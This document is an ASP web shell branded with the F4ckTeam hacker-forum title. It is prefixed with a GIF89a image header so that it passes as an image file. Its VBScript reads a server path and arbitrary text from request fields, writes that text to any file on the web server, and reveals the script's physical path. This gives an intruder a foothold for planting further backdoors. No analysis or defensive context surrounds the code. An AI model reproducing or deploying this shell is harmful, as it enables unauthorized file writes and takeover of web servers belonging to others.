gif89a
<%@LANGUAGE="VBScript" CODEPAGE="936"%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>法客论坛 - F4ckTeam</title>
<style type="text/css">
<!--
.black {
	font-family: "宋体";
	font-size: 12px;
	color: #000000;
	text-decoration: none;
	line-height: 120%;}
-->
</style>
<style type="text/css">
<!--
a:link {
	font-family: "宋体";
	font-size: 12px;
	color: #00CC00;
	text-decoration: none;
}
a:visited {
	font-family: "宋体";
	font-size: 12px;
	color: #00CC00;
	text-decoration: none;
}
a:hover {
	font-family: "宋体";
	font-size: 12px;
	color: #333333;
	text-decoration: none;
}
-->
</style>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<p>
<% dim FSO %>
<% dim Data %>
<% dim MyFile %>
<% on error resume next %>
<% Set FSO = Server.CreateObject("Scripting.FileSystemObject") %>
<% if Trim(request("path1"))<>"" then %>
<% Data = request("path2") %>
<% Set MyFile=FSO.CreateTextFile(request("path1"),True) %>
<% MyFile.Write Data %>
<% if err =0 then %>
<% response.write "<font color=#FFFF00>写入成功! </font>" %>
<% else %>
<% response.write "<font color=#FFFF00>写入失败!</font>" %>
<% end if %>
<% err.clear %>
<% end if %>
<% MyFile.Close %>
<% Set MyFile=Nothing %>
<% Set FSO = Nothing %>
<% Response.write "</form>" %>
</p>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF">
<tr>
<td height="100%"> 
<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<tr>
<td><table width="700" border="0" align="center" cellpadding="0" cellspacing="1">
<tr>
<td bgcolor="#FFFFFF"><span class="black"> 
<% Response.write "我的位置:" %>
<%=server.mappath(Request.ServerVariables("SCRIPT_NAME")) %>
<br>
<% Response.write "<form action='''' method=post>" %>
</span> </td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><span class="black">这里填路径：<% Response.Write "<input type=text name=path1 width=200 size=81>" %>
</span></td>
</tr>
<tr>
<td bgcolor="#FFFFFF" class="black">
<% Response.write "这里填内容：" %>
<% Response.write "<textarea name=path2 cols=80 rows=15 width=32></textarea>" %>
</td>
</tr>
<tr>
<td bgcolor="#FFFFFF"><div align="center"><span class="black">
<% Response.write "<input type=submit value=GO>" %>
</span></div></td>
</tr>
</tr>
<td bgcolor="#FFFFFF" class="black"><div align="center"></a></div></td>
</tr>
</table></td>
</tr>
</table></td>
</tr>
</table>
</body>
</html>